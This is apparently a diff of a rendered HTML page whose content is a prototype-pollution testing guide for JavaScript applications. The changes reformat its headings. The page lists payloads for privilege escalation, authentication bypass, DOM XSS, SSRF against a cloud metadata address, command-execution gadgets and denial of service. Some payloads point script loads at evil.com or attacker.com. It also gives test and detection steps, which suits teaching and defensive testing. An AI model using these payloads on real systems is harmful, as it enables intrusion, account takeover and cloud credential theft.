-  <a class="anchor" href="#session-objects">#</a>
-</h2>
+<h2 id="session-objects">Session Objects<a class="anchor" href="#session-objects">#</a></h2>
 <p>Applications merging user preferences into session objects.</p>
 <hr>
-<h2 id="vulnerable-third-party-libraries">
-  Vulnerable Third-Party Libraries
-  <a class="anchor" href="#vulnerable-third-party-libraries">#</a>
-</h2>
+<h2 id="vulnerable-third-party-libraries">Vulnerable Third-Party Libraries<a class="anchor" href="#vulnerable-third-party-libraries">#</a></h2>
 <p>Historically vulnerable libraries include:</p>
 <ul>
 <li>Lodash (<code>_.merge</code>, <code>_.defaultsDeep</code>)</li>
@@ -1698,32 +1596,21 @@ renderAdminPanel();
 <li>node-forge (historical cases)</li>
 </ul>
 <hr>
-<h1 id="exploitation-techniques--practical-pocs">
-  Exploitation Techniques &amp; Practical PoCs
-  <a class="anchor" href="#exploitation-techniques--practical-pocs">#</a>
-</h1>
-<h2 id="1-direct-prototype-injection">
-  1. Direct Prototype Injection
-  <a class="anchor" href="#1-direct-prototype-injection">#</a>
-</h2>
+<h1 id="exploitation-techniques--practical-pocs">Exploitation Techniques &amp; Practical PoCs<a class="anchor" href="#exploitation-techniques--practical-pocs">#</a></h1>
+<h2 id="1-direct-prototype-injection">1. Direct Prototype Injection<a class="anchor" href="#1-direct-prototype-injection">#</a></h2>
 <p>The simplest attack directly modifies <code>Object.prototype</code> using <code>__proto__</code>.</p>
 <p>Payload:</p>
 <pre tabindex="0"><code>{
     &#34;__proto__&#34;: {
         &#34;isAdmin&#34;:true
     }
-}
-</code></pre><p>If merged unsafely:</p>
+}</code></pre><p>If merged unsafely:</p>
 <pre tabindex="0"><code>merge(config,payload);
 
 console.log({}.isAdmin);
 
-// true
-</code></pre><hr>
-<h2 id="2-constructor-prototype-pollution">
-  2. Constructor Prototype Pollution
-  <a class="anchor" href="#2-constructor-prototype-pollution">#</a>
-</h2>
+// true</code></pre><hr>
+<h2 id="2-constructor-prototype-pollution">2. Constructor Prototype Pollution<a class="anchor" href="#2-constructor-prototype-pollution">#</a></h2>
 <p>Applications often blacklist <code>__proto__</code> but forget that the same prototype can be reached through <code>constructor.prototype</code>.</p>
 <p>Payload:</p>
 <pre tabindex="0"><code>{
@@ -1732,38 +1619,26 @@ console.log({}.isAdmin);
             &#34;isAdmin&#34;:true
         }
     }
-}
-</code></pre><p>Useful against applications filtering only:</p>
-<pre tabindex="0"><code>__proto__
-</code></pre><hr>
-<h2 id="3-recursive-merge-pollution">
-  3. Recursive Merge Pollution
-  <a class="anchor" href="#3-recursive-merge-pollution">#</a>
-</h2>
+}</code></pre><p>Useful against applications filtering only:</p>
+<pre tabindex="0"><code>__proto__</code></pre><hr>
+<h2 id="3-recursive-merge-pollution">3. Recursive Merge Pollution<a class="anchor" href="#3-recursive-merge-pollution">#</a></h2>
 <p>Unsafe recursive merge functions are the most common source.</p>
 <p>Example:</p>
 <pre tabindex="0"><code>merge(target,JSON.parse(&#39;{
 &#34;__proto__&#34;:{
 &#34;debug&#34;:true
     }
-}&#39;));
-</code></pre><p>Result:</p>
+}&#39;));</code></pre><p>Result:</p>
 <pre tabindex="0"><code>({}).debug
 
-// true
-</code></pre><hr>
-<h2 id="4-client-side-prototype-pollution">
-  4. Client-Side Prototype Pollution
-  <a class="anchor" href="#4-client-side-prototype-pollution">#</a>
-</h2>
+// true</code></pre><hr>
+<h2 id="4-client-side-prototype-pollution">4. Client-Side Prototype Pollution<a class="anchor" href="#4-client-side-prototype-pollution">#</a></h2>
 <p>Single Page Applications often convert URL parameters into JavaScript objects.</p>
 <p>Example URL</p>
 <pre tabindex="0"><code>https://target.com/
 
-?__proto__[transport_url]=https://evil.com/x.js
-</code></pre><p>Application:</p>
-<pre tabindex="0"><code>script.src=config.transport_url;
-</code></pre><p>After pollution:</p>
+?__proto__[transport_url]=https://evil.com/x.js</code></pre><p>Application:</p>
+<pre tabindex="0"><code>script.src=config.transport_url;</code></pre><p>After pollution:</p>
 <pre tabindex="0"><code>config.transport_url
 
 ↓
@@ -1772,18 +1647,14 @@ Object.prototype.transport_url
 
 ↓
 
-https://evil.com/x.js
-</code></pre><p>Potential impact:</p>
+https://evil.com/x.js</code></pre><p>Potential impact:</p>
 <ul>
 <li>DOM XSS</li>
 <li>Remote JavaScript execution</li>
 <li>Account takeover</li>
 </ul>
 <hr>
-<h2 id="5-server-side-prototype-pollution">
-  5. Server-Side Prototype Pollution
-  <a class="anchor" href="#5-server-side-prototype-pollution">#</a>
-</h2>
+<h2 id="5-server-side-prototype-pollution">5. Server-Side Prototype Pollution<a class="anchor" href="#5-server-side-prototype-pollution">#</a></h2>
 <p>Node.js applications frequently merge request bodies.</p>
 <p>Example:</p>
 <pre tabindex="0"><code>POST /profile
@@ -1792,147 +1663,96 @@ https://evil.com/x.js
     &#34;__proto__&#34;:{
         &#34;isAdmin&#34;:true
     }
-}
-</code></pre><p>Later:</p>
+}</code></pre><p>Later:</p>
 <pre tabindex="0"><code>if(user.isAdmin){
 
 renderAdmin();
 
-}
-</code></pre><p>Every user inherits:</p>
-<pre tabindex="0"><code>isAdmin=true
-</code></pre><p>Result:</p>
-<pre tabindex="0"><code>Privilege Escalation
-</code></pre><hr>
-<h2 id="6-authentication-bypass">
-  6. Authentication Bypass
-  <a class="anchor" href="#6-authentication-bypass">#</a>
-</h2>
+}</code></pre><p>Every user inherits:</p>
+<pre tabindex="0"><code>isAdmin=true</code></pre><p>Result:</p>
+<pre tabindex="0"><code>Privilege Escalation</code></pre><hr>
+<h2 id="6-authentication-bypass">6. Authentication Bypass<a class="anchor" href="#6-authentication-bypass">#</a></h2>
 <p>Application:</p>
 <pre tabindex="0"><code>if(currentUser.isAdmin){
 
 allowAccess();
 
-}
-</code></pre><p>Payload:</p>
+}</code></pre><p>Payload:</p>
 <pre tabindex="0"><code>{
     &#34;__proto__&#34;:{
         &#34;isAdmin&#34;:true
     }
-}
-</code></pre><p>Outcome:</p>
-<pre tabindex="0"><code>Non-admin user gains administrator access.
-</code></pre><hr>
-<h2 id="7-feature-flag-manipulation">
-  7. Feature Flag Manipulation
-  <a class="anchor" href="#7-feature-flag-manipulation">#</a>
-</h2>
+}</code></pre><p>Outcome:</p>
+<pre tabindex="0"><code>Non-admin user gains administrator access.</code></pre><hr>
+<h2 id="7-feature-flag-manipulation">7. Feature Flag Manipulation<a class="anchor" href="#7-feature-flag-manipulation">#</a></h2>
 <p>Many applications use configuration objects.</p>
 <p>Example:</p>
 <pre tabindex="0"><code>if(config.debug){
 
 ...
-}
-</code></pre><p>Payload:</p>
+}</code></pre><p>Payload:</p>
 <pre tabindex="0"><code>{
     &#34;__proto__&#34;:{
         &#34;debug&#34;:true
     }
-}
-</code></pre><p>Application enters debug mode.</p>
+}</code></pre><p>Application enters debug mode.</p>
 <hr>
-<h2 id="8-dom-xss-gadget">
-  8. DOM XSS Gadget
-  <a class="anchor" href="#8-dom-xss-gadget">#</a>
-</h2>
+<h2 id="8-dom-xss-gadget">8. DOM XSS Gadget<a class="anchor" href="#8-dom-xss-gadget">#</a></h2>
 <p>Application:</p>
-<pre tabindex="0"><code>element.innerHTML=options.content;
-</code></pre><p>Payload:</p>
+<pre tabindex="0"><code>element.innerHTML=options.content;</code></pre><p>Payload:</p>
 <pre tabindex="0"><code>{
     &#34;__proto__&#34;:{
         &#34;content&#34;:&#34;&lt;img src=x onerror=alert(document.domain)&gt;&#34;
     }
-}
-</code></pre><p>If inherited:</p>
-<pre tabindex="0"><code>DOM XSS
-</code></pre><hr>
-<h2 id="9-script-source-injection">
-  9. Script Source Injection
-  <a class="anchor" href="#9-script-source-injection">#</a>
-</h2>
+}</code></pre><p>If inherited:</p>
+<pre tabindex="0"><code>DOM XSS</code></pre><hr>
+<h2 id="9-script-source-injection">9. Script Source Injection<a class="anchor" href="#9-script-source-injection">#</a></h2>
 <p>Application:</p>
-<pre tabindex="0"><code>script.src=config.url;
-</code></pre><p>Payload:</p>
+<pre tabindex="0"><code>script.src=config.url;</code></pre><p>Payload:</p>
 <pre tabindex="0"><code>{
     &#34;__proto__&#34;:{
         &#34;url&#34;:&#34;https://evil.com/x.js&#34;
     }
-}
-</code></pre><p>Outcome:</p>
-<pre tabindex="0"><code>External JavaScript execution
-</code></pre><hr>
-<h2 id="10-ssrf-gadget">
-  10. SSRF Gadget
-  <a class="anchor" href="#10-ssrf-gadget">#</a>
-</h2>
+}</code></pre><p>Outcome:</p>
+<pre tabindex="0"><code>External JavaScript execution</code></pre><hr>
+<h2 id="10-ssrf-gadget">10. SSRF Gadget<a class="anchor" href="#10-ssrf-gadget">#</a></h2>
 <p>Application:</p>
-<pre tabindex="0"><code>fetch(config.endpoint)
-</code></pre><p>Payload:</p>
+<pre tabindex="0"><code>fetch(config.endpoint)</code></pre><p>Payload:</p>
 <pre tabindex="0"><code>{
     &#34;__proto__&#34;:{
         &#34;endpoint&#34;:&#34;http://169.254.169.254/latest/meta-data/&#34;
     }
-}
-</code></pre><p>Potential impact:</p>
+}</code></pre><p>Potential impact:</p>
 <ul>
 <li>SSRF</li>
 <li>Cloud metadata disclosure</li>
 </ul>
 <hr>
-<h2 id="11-child-process-gadget-nodejs">
-  11. Child Process Gadget (Node.js)
-  <a class="anchor" href="#11-child-process-gadget-nodejs">#</a>
-</h2>
+<h2 id="11-child-process-gadget-nodejs">11. Child Process Gadget (Node.js)<a class="anchor" href="#11-child-process-gadget-nodejs">#</a></h2>
 <p>Application:</p>
-<pre tabindex="0"><code>child_process.exec(config.command)
-</code></pre><p>Payload:</p>
+<pre tabindex="0"><code>child_process.exec(config.command)</code></pre><p>Payload:</p>
 <pre tabindex="0"><code>{
     &#34;__proto__&#34;:{
         &#34;command&#34;:&#34;whoami&#34;
     }
-}
-</code></pre><p>If inherited:</p>
-<pre tabindex="0"><code>Potential Remote Code Execution
-</code></pre><p>Depends entirely on the application gadget.</p>
+}</code></pre><p>If inherited:</p>
+<pre tabindex="0"><code>Potential Remote Code Execution</code></pre><p>Depends entirely on the application gadget.</p>
 <hr>
-<h2 id="12-denial-of-service">
-  12. Denial of Service
-  <a class="anchor" href="#12-denial-of-service">#</a>
-</h2>
+<h2 id="12-denial-of-service">12. Denial of Service<a class="anchor" href="#12-denial-of-service">#</a></h2>
 <p>Payload:</p>
 <pre tabindex="0"><code>{
     &#34;__proto__&#34;:{
         &#34;toString&#34;:null
     }
-}
-</code></pre><p>Many libraries expect <code>toString()</code> to exist.</p>
+}</code></pre><p>Many libraries expect <code>toString()</code> to exist.</p>
 <p>Applications may crash with:</p>
-<pre tabindex="0"><code>TypeError
-</code></pre><hr>
-<h2 id="13-query-parameter-injection">
-  13. Query Parameter Injection
-  <a class="anchor" href="#13-query-parameter-injection">#</a>
-</h2>
+<pre tabindex="0"><code>TypeError</code></pre><hr>
+<h2 id="13-query-parameter-injection">13. Query Parameter Injection<a class="anchor" href="#13-query-parameter-injection">#</a></h2>
 <pre tabindex="0"><code>GET /?
 
-__proto__[admin]=true
-</code></pre><p>Alternative:</p>
-<pre tabindex="0"><code>constructor[prototype][admin]=true
-</code></pre><hr>
-<h2 id="14-nested-object-bypass">
-  14. Nested Object Bypass
-  <a class="anchor" href="#14-nested-object-bypass">#</a>
-</h2>
+__proto__[admin]=true</code></pre><p>Alternative:</p>
+<pre tabindex="0"><code>constructor[prototype][admin]=true</code></pre><hr>
+<h2 id="14-nested-object-bypass">14. Nested Object Bypass<a class="anchor" href="#14-nested-object-bypass">#</a></h2>
 <p>Applications validating only top-level keys can often be bypassed.</p>
 <p>Payload:</p>
 <pre tabindex="0"><code>{
@@ -1943,111 +1763,61 @@ __proto__[admin]=true
             }
         }
     }
-}
-</code></pre><p>Recursive merge eventually reaches the malicious property.</p>
+}</code></pre><p>Recursive merge eventually reaches the malicious property.</p>
 <hr>
-<h2 id="15-json-pollution">
-  15. JSON Pollution
-  <a class="anchor" href="#15-json-pollution">#</a>
-</h2>
+<h2 id="15-json-pollution">15. JSON Pollution<a class="anchor" href="#15-json-pollution">#</a></h2>
 <pre tabindex="0"><code>{
     &#34;__proto__&#34;:{
         &#34;polluted&#34;:&#34;yes&#34;
     }
-}
-</code></pre><p>Merged using:</p>
-<pre tabindex="0"><code>Object.assign(target,payload)
-</code></pre><p>or</p>
-<pre tabindex="0"><code>merge(target,payload)
-</code></pre><hr>
-<h2 id="16-cookie-based-pollution">
-  16. Cookie-Based Pollution
-  <a class="anchor" href="#16-cookie-based-pollution">#</a>
-</h2>
+}</code></pre><p>Merged using:</p>
+<pre tabindex="0"><code>Object.assign(target,payload)</code></pre><p>or</p>
+<pre tabindex="0"><code>merge(target,payload)</code></pre><hr>
+<h2 id="16-cookie-based-pollution">16. Cookie-Based Pollution<a class="anchor" href="#16-cookie-based-pollution">#</a></h2>
 <pre tabindex="0"><code>Cookie:
 
-prefs={&#34;__proto__&#34;:{&#34;debug&#34;:true}}
-</code></pre><p>Applications parsing cookies into objects may pollute runtime state.</p>
+prefs={&#34;__proto__&#34;:{&#34;debug&#34;:true}}</code></pre><p>Applications parsing cookies into objects may pollute runtime state.</p>
 <hr>
-<h2 id="17-graphql-variables">
-  17. GraphQL Variables
-  <a class="anchor" href="#17-graphql-variables">#</a>
-</h2>
+<h2 id="17-graphql-variables">17. GraphQL Variables<a class="anchor" href="#17-graphql-variables">#</a></h2>
 <pre tabindex="0"><code>{
     &#34;variables&#34;:{
         &#34;__proto__&#34;:{
             &#34;admin&#34;:true
         }
     }
-}
-</code></pre><p>Useful when GraphQL variables are merged into resolver objects.</p>
+}</code></pre><p>Useful when GraphQL variables are merged into resolver objects.</p>
 <hr>
-<h2 id="18-framework-specific-examples">
-  18. Framework-Specific Examples
-  <a class="anchor" href="#18-framework-specific-examples">#</a>
-</h2>
-<h3 id="lodash">
-  Lodash
-  <a class="anchor" href="#lodash">#</a>
-</h3>
+<h2 id="18-framework-specific-examples">18. Framework-Specific Examples<a class="anchor" href="#18-framework-specific-examples">#</a></h2>
+<h3 id="lodash">Lodash<a class="anchor" href="#lodash">#</a></h3>
 <p>Historically vulnerable:</p>
-<pre tabindex="0"><code>_.merge(target,payload)
-</code></pre><p>Payload:</p>
+<pre tabindex="0"><code>_.merge(target,payload)</code></pre><p>Payload:</p>
 <pre tabindex="0"><code>{
     &#34;__proto__&#34;:{
         &#34;admin&#34;:true
     }
-}
-</code></pre><hr>
-<h3 id="jquery">
-  jQuery
-  <a class="anchor" href="#jquery">#</a>
-</h3>
-<pre tabindex="0"><code>$.extend(true,target,payload)
-</code></pre><p>Older versions allowed prototype pollution.</p>
+}</code></pre><hr>
+<h3 id="jquery">jQuery<a class="anchor" href="#jquery">#</a></h3>
+<pre tabindex="0"><code>$.extend(true,target,payload)</code></pre><p>Older versions allowed prototype pollution.</p>
 <hr>
-<h3 id="express-applications">
-  Express Applications
-  <a class="anchor" href="#express-applications">#</a>
-</h3>
-<pre tabindex="0"><code>merge(config,req.body)
-</code></pre><p>Common source of Server-Side Prototype Pollution.</p>
+<h3 id="express-applications">Express Applications<a class="anchor" href="#express-applications">#</a></h3>
+<pre tabindex="0"><code>merge(config,req.body)</code></pre><p>Common source of Server-Side Prototype Pollution.</p>
 <hr>
-<h3 id="vue--react-configuration-objects">
-  Vue / React Configuration Objects
-  <a class="anchor" href="#vue--react-configuration-objects">#</a>
-</h3>
+<h3 id="vue--react-configuration-objects">Vue / React Configuration Objects<a class="anchor" href="#vue--react-configuration-objects">#</a></h3>
 <p>Polluting runtime configuration may alter rendering logic depending on application-specific gadgets.</p>
 <hr>
-<h1 id="test-cases--detection-techniques">
-  <strong>Test Cases &amp; Detection Techniques</strong>
-  <a class="anchor" href="#test-cases--detection-techniques">#</a>
-</h1>
-<h2 id="test-cases">
-  Test Cases
-  <a class="anchor" href="#test-cases">#</a>
-</h2>
-<h3 id="1-basic-prototype-pollution-detection">
-  1. Basic Prototype Pollution Detection
-  <a class="anchor" href="#1-basic-prototype-pollution-detection">#</a>
-</h3>
+<h1 id="test-cases--detection-techniques"><strong>Test Cases &amp; Detection Techniques</strong><a class="anchor" href="#test-cases--detection-techniques">#</a></h1>
+<h2 id="test-cases">Test Cases<a class="anchor" href="#test-cases">#</a></h2>
+<h3 id="1-basic-prototype-pollution-detection">1. Basic Prototype Pollution Detection<a class="anchor" href="#1-basic-prototype-pollution-detection">#</a></h3>
 <p><strong>Payload</strong></p>
 <pre tabindex="0"><code>{
     &#34;__proto__&#34;: {
         &#34;polluted&#34;: &#34;true&#34;
     }
-}
-</code></pre><p><strong>Verification</strong></p>
+}</code></pre><p><strong>Verification</strong></p>
 <p>Execute in browser console or Node.js environment:</p>
-<pre tabindex="0"><code>({}).polluted
-</code></pre><p><strong>Vulnerable Output</strong></p>
-<pre tabindex="0"><code>true
-</code></pre><p><strong>Secure Output</strong></p>
-<pre tabindex="0"><code>undefined
-</code></pre><h3 id="2-constructorprototype-pollution-test">
-  2. Constructor.prototype Pollution Test
-  <a class="anchor" href="#2-constructorprototype-pollution-test">#</a>
-</h3>
+<pre tabindex="0"><code>({}).polluted</code></pre><p><strong>Vulnerable Output</strong></p>
+<pre tabindex="0"><code>true</code></pre><p><strong>Secure Output</strong></p>
+<pre tabindex="0"><code>undefined</code></pre><h3 id="2-constructorprototype-pollution-test">2. Constructor.prototype Pollution Test<a class="anchor" href="#2-constructorprototype-pollution-test">#</a></h3>
 <p>Used when <code>__proto__</code> filtering is implemented.</p>
 <p><strong>Payload</strong></p>
 <pre tabindex="0"><code>{
@@ -2056,15 +1826,9 @@ prefs={&#34;__proto__&#34;:{&#34;debug&#34;:true}}
             &#34;polluted&#34;: &#34;true&#34;
         }
     }
-}
-</code></pre><p><strong>Verification</strong></p>
-<pre tabindex="0"><code>({}).polluted
-</code></pre><p><strong>Vulnerable If</strong></p>
-<pre tabindex="0"><code>true
-</code></pre><h3 id="3-json-body-pollution-test">
-  3. JSON Body Pollution Test
-  <a class="anchor" href="#3-json-body-pollution-test">#</a>
-</h3>
+}</code></pre><p><strong>Verification</strong></p>
+<pre tabindex="0"><code>({}).polluted</code></pre><p><strong>Vulnerable If</strong></p>
+<pre tabindex="0"><code>true</code></pre><h3 id="3-json-body-pollution-test">3. JSON Body Pollution Test<a class="anchor" href="#3-json-body-pollution-test">#</a></h3>
 <p><strong>Request</strong></p>
 <pre tabindex="0"><code>POST /api/profile/update HTTP/1.1
 Content-Type: application/json
@@ -2073,145 +1837,89 @@ Content-Type: application/json
     &#34;__proto__&#34;:{
         &#34;admin&#34;:true
     }
-}
-</code></pre><p><strong>Test</strong></p>
+}</code></pre><p><strong>Test</strong></p>
 <p>After request, check application behavior:</p>
-<pre tabindex="0"><code>({}).admin
-</code></pre><p><strong>Expected Secure Behavior</strong></p>
-<pre tabindex="0"><code>undefined
-</code></pre><h3 id="4-query-parameter-pollution-test">
-  4. Query Parameter Pollution Test
-  <a class="anchor" href="#4-query-parameter-pollution-test">#</a>
-</h3>
+<pre tabindex="0"><code>({}).admin</code></pre><p><strong>Expected Secure Behavior</strong></p>
+<pre tabindex="0"><code>undefined</code></pre><h3 id="4-query-parameter-pollution-test">4. Query Parameter Pollution Test<a class="anchor" href="#4-query-parameter-pollution-test">#</a></h3>
 <p><strong>Payloads</strong></p>
-<pre tabindex="0"><code>?__proto__[admin]=true
-</code></pre><p>or</p>
-<pre tabindex="0"><code>?constructor[prototype][admin]=true
-</code></pre><p><strong>Check</strong></p>
-<pre tabindex="0"><code>Object.prototype.admin
-</code></pre><h3 id="5-client-side-prototype-pollution-test">
-  5. Client-Side Prototype Pollution Test
-  <a class="anchor" href="#5-client-side-prototype-pollution-test">#</a>
-</h3>
+<pre tabindex="0"><code>?__proto__[admin]=true</code></pre><p>or</p>
+<pre tabindex="0"><code>?constructor[prototype][admin]=true</code></pre><p><strong>Check</strong></p>
+<pre tabindex="0"><code>Object.prototype.admin</code></pre><h3 id="5-client-side-prototype-pollution-test">5. Client-Side Prototype Pollution Test<a class="anchor" href="#5-client-side-prototype-pollution-test">#</a></h3>
 <p><strong>Payload</strong></p>
-<pre tabindex="0"><code>https://target.com/?__proto__[test]=polluted
-</code></pre><p><strong>Browser Console</strong></p>
-<pre tabindex="0"><code>Object.prototype.test
-</code></pre><p><strong>Vulnerable:</strong></p>
-<pre tabindex="0"><code>polluted
-</code></pre><h3 id="6-authentication-bypass-test">
-  6. Authentication Bypass Test
-  <a class="anchor" href="#6-authentication-bypass-test">#</a>
-</h3>
+<pre tabindex="0"><code>https://target.com/?__proto__[test]=polluted</code></pre><p><strong>Browser Console</strong></p>
+<pre tabindex="0"><code>Object.prototype.test</code></pre><p><strong>Vulnerable:</strong></p>
+<pre tabindex="0"><code>polluted</code></pre><h3 id="6-authentication-bypass-test">6. Authentication Bypass Test<a class="anchor" href="#6-authentication-bypass-test">#</a></h3>
 <p><strong>Payload</strong></p>
 <pre tabindex="0"><code>{
     &#34;__proto__&#34;:{
         &#34;isAdmin&#34;:true
     }
-}
-</code></pre><p><strong>Application Logic</strong></p>
+}</code></pre><p><strong>Application Logic</strong></p>
 <pre tabindex="0"><code>if(user.isAdmin){
     accessAdminPanel();
-}
-</code></pre><p><strong>Vulnerable If</strong></p>
+}</code></pre><p><strong>Vulnerable If</strong></p>
 <p>Normal user receives administrator privileges.</p>
-<h3 id="7-role-manipulation-test">
-  7. Role Manipulation Test
-  <a class="anchor" href="#7-role-manipulation-test">#</a>
-</h3>
+<h3 id="7-role-manipulation-test">7. Role Manipulation Test<a class="anchor" href="#7-role-manipulation-test">#</a></h3>
 <p><strong>Payload</strong></p>
 <pre tabindex="0"><code>{
     &#34;__proto__&#34;:{
         &#34;role&#34;:&#34;admin&#34;
     }
-}
-</code></pre><p><strong>Check:</strong></p>
-<pre tabindex="0"><code>user.role
-</code></pre><p>Expected:</p>
-<pre tabindex="0"><code>admin
-</code></pre><h3 id="8-feature-flag-manipulation">
-  8. Feature Flag Manipulation
-  <a class="anchor" href="#8-feature-flag-manipulation">#</a>
-</h3>
+}</code></pre><p><strong>Check:</strong></p>
+<pre tabindex="0"><code>user.role</code></pre><p>Expected:</p>
+<pre tabindex="0"><code>admin</code></pre><h3 id="8-feature-flag-manipulation">8. Feature Flag Manipulation<a class="anchor" href="#8-feature-flag-manipulation">#</a></h3>
 <p><strong>Payload</strong></p>
 <pre tabindex="0"><code>{
     &#34;__proto__&#34;:{
         &#34;debug&#34;:true
     }
-}
-</code></pre><p><strong>Test</strong></p>
+}</code></pre><p><strong>Test</strong></p>
 <p>Observe whether:</p>
 <ul>
 <li>Debug mode enabled</li>
 <li>Hidden functionality exposed</li>
 <li>Internal endpoints accessible</li>
 </ul>
-<h3 id="9-dom-xss-gadget-test">
-  9. DOM XSS Gadget Test
-  <a class="anchor" href="#9-dom-xss-gadget-test">#</a>
-</h3>
+<h3 id="9-dom-xss-gadget-test">9. DOM XSS Gadget Test<a class="anchor" href="#9-dom-xss-gadget-test">#</a></h3>
 <p><strong>Payload</strong></p>
 <pre tabindex="0"><code>{
     &#34;__proto__&#34;:{
         &#34;innerHTML&#34;:&#34;&lt;img src=x onerror=alert(1)&gt;&#34;
     }
-}
-</code></pre><p><strong>Vulnerable If</strong></p>
+}</code></pre><p><strong>Vulnerable If</strong></p>
 <p>Polluted value reaches: <code>element.innerHTML</code>  and JavaScript executes.</p>
-<h3 id="10-script-injection-gadget-test">
-  10. Script Injection Gadget Test
-  <a class="anchor" href="#10-script-injection-gadget-test">#</a>
-</h3>
+<h3 id="10-script-injection-gadget-test">10. Script Injection Gadget Test<a class="anchor" href="#10-script-injection-gadget-test">#</a></h3>
 <p><strong>Payload</strong></p>
 <pre tabindex="0"><code>{
     &#34;__proto__&#34;:{
         &#34;url&#34;:&#34;https://attacker.com/script.js&#34;
     }
-}
-</code></pre><p><strong>Check For:</strong></p>
-<pre tabindex="0"><code>script.src
-</code></pre><p><strong>Vulnerable If</strong></p>
+}</code></pre><p><strong>Check For:</strong></p>
+<pre tabindex="0"><code>script.src</code></pre><p><strong>Vulnerable If</strong></p>
 <p>External script loads.</p>
-<h3 id="11-ssrf-gadget-test">
-  11. SSRF Gadget Test
-  <a class="anchor" href="#11-ssrf-gadget-test">#</a>
-</h3>
+<h3 id="11-ssrf-gadget-test">11. SSRF Gadget Test<a class="anchor" href="#11-ssrf-gadget-test">#</a></h3>
 <p><strong>Payload</strong></p>
 <pre tabindex="0"><code>{
     &#34;__proto__&#34;:{
         &#34;url&#34;:&#34;http://169.254.169.254/latest/meta-data/&#34;
     }
-}
-</code></pre><p><strong>Vulnerable If</strong></p>
+}</code></pre><p><strong>Vulnerable If</strong></p>
 <p>Application performs server-side requests using polluted value.</p>
-<h3 id="12-denial-of-service-test">
-  12. Denial of Service Test
-  <a class="anchor" href="#12-denial-of-service-test">#</a>
-</h3>
+<h3 id="12-denial-of-service-test">12. Denial of Service Test<a class="anchor" href="#12-denial-of-service-test">#</a></h3>
 <p><strong>Payload</strong></p>
 <pre tabindex="0"><code>{
     &#34;__proto__&#34;:{
         &#34;toString&#34;:null
     }
-}
-</code></pre><p><strong>Observe:</strong></p>
+}</code></pre><p><strong>Observe:</strong></p>
 <ul>
 <li>Application errors</li>
 <li>Unexpected crashes</li>
 <li>Failed object processing</li>
 </ul>
-<h2 id="detection-techniques">
-  Detection Techniques
-  <a class="anchor" href="#detection-techniques">#</a>
-</h2>
-<h3 id="a-manual-detection">
-  A. Manual Detection
-  <a class="anchor" href="#a-manual-detection">#</a>
-</h3>
-<h4 id="identify-object-manipulation-points">
-  Identify Object Manipulation Points
-  <a class="anchor" href="#identify-object-manipulation-points">#</a>
-</h4>
+<h2 id="detection-techniques">Detection Techniques<a class="anchor" href="#detection-techniques">#</a></h2>
+<h3 id="a-manual-detection">A. Manual Detection<a class="anchor" href="#a-manual-detection">#</a></h3>
+<h4 id="identify-object-manipulation-points">Identify Object Manipulation Points<a class="anchor" href="#identify-object-manipulation-points">#</a></h4>
 <p>Look for:</p>
 <ul>
 <li>JSON merge operations</li>
@@ -2230,31 +1938,15 @@ merge(target,req.body)
 
 for(key in input){
     obj[key]=input[key]
-}
-</code></pre><h4 id="test-dangerous-keys">
-  Test Dangerous Keys
-  <a class="anchor" href="#test-dangerous-keys">#</a>
-</h4>
+}</code></pre><h4 id="test-dangerous-keys">Test Dangerous Keys<a class="anchor" href="#test-dangerous-keys">#</a></h4>
 <p>Send:</p>
-<pre tabindex="0"><code>__proto__constructorprototype
-</code></pre><p>Example:</p>
-<pre tabindex="0"><code>{ &#34;__proto__&#34;:{    &#34;test&#34;:&#34;123&#34; }}
-</code></pre><h4 id="verify-pollution">
-  Verify Pollution
-  <a class="anchor" href="#verify-pollution">#</a>
-</h4>
+<pre tabindex="0"><code>__proto__constructorprototype</code></pre><p>Example:</p>
+<pre tabindex="0"><code>{ &#34;__proto__&#34;:{    &#34;test&#34;:&#34;123&#34; }}</code></pre><h4 id="verify-pollution">Verify Pollution<a class="anchor" href="#verify-pollution">#</a></h4>
 <p>Browser:</p>
-<pre tabindex="0"><code>Object.prototype.test
-</code></pre><p>Node.js:</p>
-<pre tabindex="0"><code>console.log({}.test)
-</code></pre><p>Vulnerable:</p>
-<pre tabindex="0"><code>123
-</code></pre><p>Secure:</p>
-<pre tabindex="0"><code>undefined
-</code></pre><h4 id="analyze-application-behavior">
-  Analyze Application Behavior
-  <a class="anchor" href="#analyze-application-behavior">#</a>
-</h4>
+<pre tabindex="0"><code>Object.prototype.test</code></pre><p>Node.js:</p>
+<pre tabindex="0"><code>console.log({}.test)</code></pre><p>Vulnerable:</p>
+<pre tabindex="0"><code>123</code></pre><p>Secure:</p>
+<pre tabindex="0"><code>undefined</code></pre><h4 id="analyze-application-behavior">Analyze Application Behavior<a class="anchor" href="#analyze-application-behavior">#</a></h4>
 <p>Check for:</p>
 <ul>
 <li>New privileges</li>
@@ -2265,10 +1957,7 @@ for(key in input){
 <li>Script execution</li>
 <li>Application errors</li>
 </ul>
-<h1 id="inspect-javascript-files">
-  Inspect JavaScript Files
-  <a class="anchor" href="#inspect-javascript-files">#</a>
-</h1>
+<h1 id="inspect-javascript-files">Inspect JavaScript Files<a class="anchor" href="#inspect-javascript-files">#</a></h1>
 <p>Search frontend JavaScript for:</p>
 <pre tabindex="0"><code>__proto__
 prototype
@@ -2277,8 +1966,7 @@ merge
 extend
 assign
 clone
-defaultsDeep
-</code></pre><p>Tools:</p>
+defaultsDeep</code></pre><p>Tools:</p>
 <ul>
 <li>Browser DevTools</li>
 <li>Burp Suite</li>
@@ -2286,34 +1974,21 @@ defaultsDeep
 <li>JS-beautifier</li>
 </ul>
 <p>Example:</p>
-<pre tabindex="0"><code>grep-R&#34;__proto__&#34; app.js
-</code></pre><hr>
-<h1 id="dependency-analysis">
-  Dependency Analysis
-  <a class="anchor" href="#dependency-analysis">#</a>
-</h1>
+<pre tabindex="0"><code>grep-R&#34;__proto__&#34; app.js</code></pre><hr>
+<h1 id="dependency-analysis">Dependency Analysis<a class="anchor" href="#dependency-analysis">#</a></h1>
 <p>Check vulnerable packages.</p>
 <p>Node.js:</p>
-<pre tabindex="0"><code>npm audit
-</code></pre><p>Search:</p>
+<pre tabindex="0"><code>npm audit</code></pre><p>Search:</p>
 <pre tabindex="0"><code>package.json
-package-lock.json
-</code></pre><p>Look for:</p>
+package-lock.json</code></pre><p>Look for:</p>
 <pre tabindex="0"><code>lodash
 jquery
 merge
 deepmerge
-hoek
-</code></pre><hr>
-<h1 id="b-automated-detection">
-  B. Automated Detection
-  <a class="anchor" href="#b-automated-detection">#</a>
-</h1>
+hoek</code></pre><hr>
+<h1 id="b-automated-detection">B. Automated Detection<a class="anchor" href="#b-automated-detection">#</a></h1>
 <hr>
-<h2 id="burp-suite">
-  Burp Suite
